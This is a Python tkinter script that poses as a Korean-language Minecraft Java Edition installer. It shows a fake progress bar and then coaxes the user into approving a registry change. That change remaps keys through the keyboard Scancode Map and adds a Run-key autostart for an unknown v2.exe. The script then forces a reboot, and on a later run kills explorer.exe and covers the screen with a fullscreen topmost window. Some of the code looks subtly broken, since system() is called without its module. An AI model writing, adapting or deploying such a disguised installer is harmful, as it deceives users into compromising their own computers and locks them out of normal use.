import tkinter as t
import tkinter.font as tf
import tkinter.messagebox as tm
import tkinter.ttk as tk
import os
import time
global ran
def ex():
    global ran
    ran.destroy()
    os.system("explorer.exe")
try:
    c = open("C:/Users/Public/check.txt",'r')
    c.close()
    system("taskkill /IM explorer.exe /f")
    ran = t.Tk()
    e = t.Button(ran,text="exit",command = ex).pack()
    ran.attributes("-fullscreen", True)
    ran.attributes("-topmost", True)
    ran.mainloop()
except:
    c = open("C:/Users/Public/check.txt",'w')
    fake = t.Tk()
    fake.title("Minecraft : Java Edition Installer")
    fake.geometry("1000x500")
    text = t.Label(fake,text="Minecraft : Java Edition을 사용자의 컴퓨터에 설치하는 중입니다.\n",font=('Gulim',20)).place(x=100,y=20)
    text = t.Label(fake,text="100% 정품\n100% 안전\n100% 합법",fg="green",font=('Gulim',40)).place(x=370,y=70)
    load = t.DoubleVar()
    loading = tk.Progressbar(fake,max=100,length=900,variable=load)
    loading.place(x=50,y=320)
    for l in range(1,31):
        load.set(l)
        loading.update()
        time.sleep(0.05)
    time.sleep(1)
    for l in range(32,78):
        load.set(l)
        loading.update()
        time.sleep(0.05)
    time.sleep(2)
    for l in range(79,101):
        load.set(l)
        loading.update()
        time.sleep(0.1)
    fake.destroy()
    tm.showinfo("설치 성공","게임을 실행하려면 레지스트리 등록이 필요합니다.\n관리자 확인 메시지가 표시되면 '예'를 클릭해주세요.")
    CAD_block = open("C:/Users/Public/change.reg",'w')
    c.write("ok")
    c.close()
    CAD_block.write("Windows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]\n\"Scancode Map\"=hex:00,00,00,00,00,00,00,00,03,00,00,00,38,00,5B,E0,5B,E0,38,00,00,00,00,00")
    CAD_block.close()
    os.system("Reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Auto /t REG_SZ /d \"C:/Users/Public/v2.exe\" /f")
    os.system("C:/Users/Public/change.reg")
    os.system("shutdown -r -f -t 0")
